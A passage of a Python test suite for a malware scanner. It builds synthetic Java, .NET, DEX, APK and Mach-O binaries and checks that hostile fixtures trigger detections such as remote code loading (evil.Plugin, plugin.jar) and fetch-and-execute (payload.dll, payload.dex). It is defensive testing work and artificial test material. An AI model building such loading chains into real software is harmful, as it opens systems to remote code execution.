    seg.write(struct.pack("<II", 0x19, 72 + 80))
    seg.write(b"__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    seg.write(struct.pack("<QQQQiiII", 0, 0x1000, 0, 0, 7, 5, 1, 0))
    seg.write(b"__text\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    seg.write(b"__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    seg.write(struct.pack("<QQIIIIIIII", 0, len(text), 0, 4, 0, 0, 0x80000400, 0, 0, 0))
    cmds.write(seg.getvalue())
    dylib_path = b"/usr/lib/libSystem.B.dylib\x00"
    dylib_path += b"\x00" * ((4 - len(dylib_path) % 4) % 4)
    cmds.write(struct.pack("<II", 0x0c, 24 + len(dylib_path)) + struct.pack("<IIII", 24, 2, 0, 0) + dylib_path)
    cmds.write(struct.pack("<II", 0x80000028, 24) + struct.pack("<QQ", 0, 0))
    sig_cmd_pos = cmds.tell()
    cmds.write(struct.pack("<IIII", 0x1d, 16, 0, 0))
    header_size = 32 + cmds.tell()
    text_file_off = header_size
    blob = text + strings
    sig_off = text_file_off + len(blob)
    cd_ident = b"com.example.thin\x00"
    ident_off = 52
    hash_off = ident_off + len(cd_ident)
    cd = struct.pack(">IIIIIIIII", 0xfade0c02, hash_off + 20, 0x20100,
                     0x2 if adhoc else 0x0, hash_off, ident_off, 0, 1, sig_off)
    cd += bytes([20, 1, 0, 12])
    cd += struct.pack(">III", 0, 0, 0)
    assert len(cd) == 52, len(cd)
    cd += cd_ident + b"\x00" * 20
    blobs = [(0, cd)]
    if entitlements is not None:
        eb = struct.pack(">II", 0xfade7171, 8 + len(entitlements)) + entitlements
        blobs.append((5, eb))
    idx = io.BytesIO()
    blobdata = io.BytesIO()
    base = 12 + 8 * len(blobs)
    for typ, b in blobs:
        idx.write(struct.pack(">II", typ, base + blobdata.tell()))
        blobdata.write(b)
    superblob = struct.pack(">III", 0xfade0cc0, base + blobdata.tell(), len(blobs)) + idx.getvalue() + blobdata.getvalue()
    hdr = struct.pack("<IIIIIIII", 0xfeedfacf, cputype, 3, 2, 4, cmds.tell(), 0, 0)
    allcmds = bytearray(cmds.getvalue())
    struct.pack_into("<Q", allcmds, 48, sig_off + len(superblob))
    struct.pack_into("<Q", allcmds, 72 + 32, text_file_off)
    struct.pack_into("<Q", allcmds, 72 + 40, len(text))
    struct.pack_into("<I", allcmds, 72 + 48, text_file_off)
    struct.pack_into("<I", allcmds, sig_cmd_pos + 8, sig_off + (0x10000 if bad_sig else 0))
    struct.pack_into("<I", allcmds, sig_cmd_pos + 12, len(superblob))
    return hdr + bytes(allcmds) + blob + superblob


def build_fat(slices, oversize_last=False):
    n = len(slices)
    header_size = 8 + 20 * n
    off = header_size
    recs = []
    body = io.BytesIO()
    for arch, data in slices:
        if off % 8:
            pad = 8 - off % 8
            body.write(b"\x00" * pad)
            off += pad
        cputype = 0x0100000c if arch == "arm64" else 0x01000007
        size = len(data) + (0x1000 if oversize_last and arch == slices[-1][0] else 0)
        recs.append((cputype, 3, off, size, 3))
        body.write(data)
        off += len(data)
    out = io.BytesIO()
    out.write(struct.pack(">II", 0xcafebabe, n))
    for r in recs:
        out.write(struct.pack(">IIIII", *r))
    out.write(body.getvalue())
    return out.getvalue()


ENTITLEMENTS_XML = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
                    b'<plist version="1.0"><dict>'
                    b'<key>com.apple.security.network.client</key><true/>'
                    b'<key>get-task-allow</key><true/>'
                    b'</dict></plist>')


# ======================================================================
# Java: parser level
# ======================================================================

def test_java_parser_benign_class_accounted():
    r = parse_class_file(benign_class())
    assert r["parsed"] and r["accounted"], r
    assert r["this_class"] == "com.example.Hello"
    assert {m["name"] for m in r["methods"]} == {"<init>", "greet"}
    assert all(m["decoded"] for m in r["methods"])
    assert r["unaccounted_items"] == [] and r["chains"] == []


def test_java_parser_hostile_remote_code_loading():
    r = parse_class_file(hostile_class())
    assert r["parsed"] and not r["accounted"]
    assert "bytecode-remote-code-loading" in [c["chain"] for c in r["chains"]]
    joined = "\n".join(r["unaccounted_items"])
    assert "evil.Plugin" in joined and "plugin.jar" in joined


def test_java_parser_truncated_class_fails_closed():
    data = benign_class()
    r = parse_class_file(data[:int(len(data) * 0.6)])
    assert not r["parsed"] and r["error"]


# ======================================================================
# Java: verdict level
# ======================================================================

def test_java_benign_class_reaches_no(tmp_path):
    v = verdict(write(tmp_path, "Hello.class", benign_class()))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    f = v["files"][0]
    assert f["verdict"] == "NO: ACCOUNTED"
    assert f["bytecode_kind"] == "java-class" and f["bytecode_accounted"]


def test_java_hostile_class_cannot_reach_no(tmp_path):
    v = verdict(write(tmp_path, "Loader.class", hostile_class()))
    assert v["headline"] == "YES: MALWARE FOUND"
    f = v["files"][0]
    assert f["verdict"].startswith("YES")
    assert "bytecode-remote-code-loading" in f["chains"] or \
        "bytecode-remote-code-loading" in [y["chain"] for y in v["yes_reasons"]]
    assert "evil.Plugin" in blockers_text(v)


def test_java_truncated_class_caps_by_name(tmp_path):
    data = benign_class()
    v = verdict(write(tmp_path, "Hello.class", data[:int(len(data) * 0.6)]))
    assert v["headline"] != "NO: NO MALWARE"
    assert "could not be parsed completely" in blockers_text(v)


def test_jar_parser_manifest_signer_and_members():
    jar = build_jar({"com/example/Hello.class": benign_class()}, signer=True)
    r = parse_jar(jar)
    assert r["parsed"]
    assert r["main_class"] == "com.example.Hello"
    assert r["class_members"] == ["com/example/Hello.class"]
    assert len(r["signers"]) == 1
    s = r["signers"][0]
    assert s["signature_file"] == "META-INF/CERT.SF" and s["has_block"]
    assert "SHA-256" in s["digest_algorithms"]


def test_jar_benign_signed_reaches_no(tmp_path):
    jar = build_jar({"com/example/Hello.class": benign_class()}, signer=True)
    v = verdict(write(tmp_path, "app.jar", jar))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
    by_rel = {f["path_in_release"]: f for f in v["files"]}
    assert by_rel["app.jar!com/example/Hello.class"]["bytecode_accounted"]
    assert by_rel["app.jar"]["bytecode_kind"] == "jar"


def test_jar_missing_main_class_caps(tmp_path):
    jar = build_jar({"com/example/Other.class": benign_class()})
    v = verdict(write(tmp_path, "app.jar", jar))
    assert v["headline"] != "NO: NO MALWARE"
    assert "Main-Class com.example.Hello" in blockers_text(v)


def test_jar_hostile_member_cannot_reach_no(tmp_path):
    jar = build_jar({"com/example/Hello.class": benign_class(),
                     "com/example/Loader.class": hostile_class()})
    v = verdict(write(tmp_path, "app.jar", jar))
    assert v["headline"] == "YES: MALWARE FOUND"
    assert "evil.Plugin" in blockers_text(v)


# ======================================================================
# .NET: parser level
# ======================================================================

def test_dotnet_parser_benign_accounted():
    r = parse_dotnet_il(build_dotnet("benign"))
    assert r["parsed"] and r["accounted"], r.get("error")
    assert r["assembly_name"] == "BenignApp"
    assert r["methods"][0]["name"] == "Main" and r["methods"][0]["decoded"]
    assert r["unaccounted_items"] == [] and r["chains"] == []


def test_dotnet_parser_hostile_fetch_execute_and_load():
    r = parse_dotnet_il(build_dotnet("hostile"))
    assert r["parsed"] and not r["accounted"]
    assert "bytecode-fetch-execute" in [c["chain"] for c in r["chains"]]
    joined = "\n".join(r["unaccounted_items"])
    assert "Assembly" in joined and "payload.dll" in joined


def test_dotnet_parser_obfuscation_indicators():
    r = parse_dotnet_il(build_dotnet("obfuscated"))
    assert r["parsed"] and not r["accounted"]
    kinds = {i["kind"] for i in r["obfuscation_indicators"]}
    assert "encrypted-string-store" in kinds
    assert "control-flow-flattening" in kinds
    assert "proxy-delegate" in kinds
    assert "encrypted string store" in "\n".join(r["unaccounted_items"])


def test_dotnet_parser_resources_enumerated():
    r = parse_dotnet_il(build_dotnet("resource"))
    assert r["accounted"], r["unaccounted_items"]
    assert r["resources"][0]["name"] == "notes.txt" and r["resources"][0]["kind"] == "text"
    r2 = parse_dotnet_il(build_dotnet("badresource"))
    assert not r2["accounted"]
    assert "payload.bin" in "\n".join(r2["unaccounted_items"])


# ======================================================================
# .NET: verdict level
# ======================================================================

def test_dotnet_benign_reaches_no(tmp_path):
    v = verdict(write(tmp_path, "BenignApp.dll", build_dotnet("benign")))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    f = v["files"][0]
    assert f["bytecode_kind"] == "dotnet" and f["bytecode_accounted"]


def test_dotnet_hostile_cannot_reach_no(tmp_path):
    v = verdict(write(tmp_path, "HostileApp.dll", build_dotnet("hostile")))
    assert v["headline"] == "YES: MALWARE FOUND"
    f = v["files"][0]
    assert "bytecode-fetch-execute" in f["chains"] or \
        "bytecode-fetch-execute" in [y["chain"] for y in v["yes_reasons"]]
    assert "payload.dll" in blockers_text(v)


def test_dotnet_obfuscated_caps_by_name(tmp_path):
    v = verdict(write(tmp_path, "ObfuscatedApp.dll", build_dotnet("obfuscated")))
    assert v["headline"] != "NO: NO MALWARE"
    assert "encrypted string store" in blockers_text(v)


def test_dotnet_bad_resource_caps_by_name(tmp_path):
    v = verdict(write(tmp_path, "BenignApp.dll", build_dotnet("badresource")))
    assert v["headline"] != "NO: NO MALWARE"
    assert "payload.bin" in blockers_text(v)


def test_dotnet_truncated_cannot_reach_no(tmp_path):
    data = build_dotnet("benign")
    v = verdict(write(tmp_path, "BenignApp.dll", data[:int(len(data) * 0.5)]))
    assert v["headline"] != "NO: NO MALWARE"


# ======================================================================
# DEX and APK: parser level
# ======================================================================

def test_dex_parser_benign_accounted():
    r = parse_dex(benign_dex())
    assert r["parsed"] and r["accounted"], r.get("error")
    assert [c["name"] for c in r["classes"]] == ["Lcom/example/MainActivity;"]
    m = r["classes"][0]["methods"][0]
    assert m["decoded"] and m["const_strings"] == ["hello from dex"]


def test_dex_parser_hostile_dynamic_loading_unaccounted():
    r = parse_dex(hostile_dex())
    assert r["parsed"] and not r["accounted"]
    joined = "\n".join(r["unaccounted_items"])
    assert "DexClassLoader" in joined and "payload.dex" in joined
    assert "evil.Payload" in joined


def test_axml_parser_components_and_permissions():
    r = parse_axml(build_axml(components=(("activity", ".MainActivity", True),
                                          ("service", ".SyncService", False))))
    assert r["parsed"], r.get("error")
    assert r["package"] == "com.example.app"
    assert r["permissions"] == ["android.permission.INTERNET"]
    comps = {c["name"]: c for c in r["components"]}
    assert comps[".MainActivity"]["exported"] is True
    assert comps[".SyncService"]["exported"] is False


# ======================================================================
# DEX and APK: verdict level
# ======================================================================

def test_dex_benign_reaches_no(tmp_path):
    v = verdict(write(tmp_path, "classes.dex", benign_dex()))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    f = v["files"][0]
    assert f["bytecode_kind"] == "dex" and f["bytecode_accounted"]


def test_dex_hostile_cannot_reach_no(tmp_path):
    v = verdict(write(tmp_path, "classes.dex", hostile_dex()))
    assert v["headline"] == "YES: MALWARE FOUND"
    assert "payload.dex" in blockers_text(v)


def test_dex_truncated_caps_by_name(tmp_path):
    data = benign_dex()
    v = verdict(write(tmp_path, "classes.dex", data[:int(len(data) * 0.7)]))
    assert v["headline"] != "NO: NO MALWARE"
    assert "truncated" in blockers_text(v) or "could not be parsed completely" in blockers_text(v)


def test_apk_benign_reaches_no(tmp_path):
    v = verdict(write(tmp_path, "app.apk", benign_apk()))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
    by_rel = {f["path_in_release"]: f for f in v["files"]}
    assert by_rel["app.apk!classes.dex"]["bytecode_accounted"]
    assert by_rel["app.apk!AndroidManifest.xml"]["bytecode_kind"] == "axml"


def test_apk_hostile_cannot_reach_no(tmp_path):
    v = verdict(write(tmp_path, "app.apk", hostile_apk()))
    assert v["headline"] == "YES: MALWARE FOUND"
    assert "payload.dex" in blockers_text(v)


def test_apk_manifest_component_without_code_caps(tmp_path):
    man = build_axml(components=(("activity", ".MainActivity", True),
                                 ("service", ".GhostService", True)))
    v = verdict(write(tmp_path, "app.apk", build_apk(man, benign_dex())))
    assert v["headline"] != "NO: NO MALWARE"
    assert "GhostService" in blockers_text(v)


# ======================================================================
# Mach-O: parser level
# ======================================================================

def test_macho_fat_split_and_parse():
    fat = build_fat([("arm64", build_macho_thin("arm64")), ("x86_64", build_macho_thin("x86_64"))])
    slices, err = split_macho_fat(fat)
    assert err is None and [s["arch"] for s in slices] == ["arm64", "x86_64"]
    r = parse_macho(fat)
    assert r["parsed"] and r["fat"]
    assert [s["arch"] for s in r["slices"]] == ["arm64", "x86_64"]
    assert all(s["parsed"] for s in r["slices"])


def test_macho_entitlements_and_adhoc_extracted():
    thin = build_macho_thin("arm64", entitlements=ENTITLEMENTS_XML, adhoc=True)
    r = parse_macho(thin)
    assert r["parsed"] and not r["fat"]
    assert "/usr/lib/libSystem.B.dylib" in r["libraries"]
    sig = r["code_signature"]
    assert sig["present"] and sig["parsed"]
    assert sig["code_directory"]["adhoc"] is True
    assert sig["code_directory"]["identifier"] == "com.example.thin"
    assert "com.apple.security.network.client" in sig["entitlements"]["keys"]
    assert sig["entitlements"]["values"]["get-task-allow"] is True


def test_macho_bad_superblob_reported_not_parsed():
    r = bytecode_report("thin", build_macho_thin("arm64", bad_sig=True))
    assert r is not None and r["kind"] == "macho"
    assert any("code signature superblob" in b for b in r["blockers"])


# ======================================================================
# Mach-O: verdict level
# ======================================================================

def test_fat_macho_slices_are_verdict_units(tmp_path):
    fat = build_fat([("arm64", build_macho_thin("arm64")), ("x86_64", build_macho_thin("x86_64"))])
    v = verdict(write(tmp_path, "app", fat))
    rels = {f["path_in_release"] for f in v["files"]}
    assert "app!slice_arm64" in rels and "app!slice_x86_64" in rels
    parent = next(f for f in v["files"] if f["path_in_release"] == "app")
    assert parent["bytecode_kind"] == "macho"
    assert [s["arch"] for s in parent["bytecode"]["slices"]] == ["arm64", "x86_64"]


def test_fat_macho_reference_matched_reaches_no(tmp_path):
    fat = build_fat([("arm64", build_macho_thin("arm64")), ("x86_64", build_macho_thin("x86_64"))])
    subject = write(tmp_path, "app", fat, sub="subject")
    reference = write(tmp_path, "app", fat, sub="reference")
    v = verdict(subject, reference=reference)
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)
    by_rel = {f["path_in_release"]: f for f in v["files"]}
    assert by_rel["app!slice_arm64"]["reference"] == "hash-match"


def test_fat_macho_oversize_slice_caps_by_name(tmp_path):
    fat = build_fat([("arm64", build_macho_thin("arm64")), ("x86_64", build_macho_thin("x86_64"))],
                    oversize_last=True)
    v = verdict(write(tmp_path, "app", fat))
    assert v["headline"] != "NO: NO MALWARE"
    assert "fat Mach-O" in blockers_text(v) and "x86_64" in blockers_text(v)


def test_macho_unverifiable_signature_caps(tmp_path):
    v = verdict(write(tmp_path, "thin", build_macho_thin("arm64", bad_sig=True)))
    assert v["headline"] != "NO: NO MALWARE"
    assert "code signature superblob" in blockers_text(v)
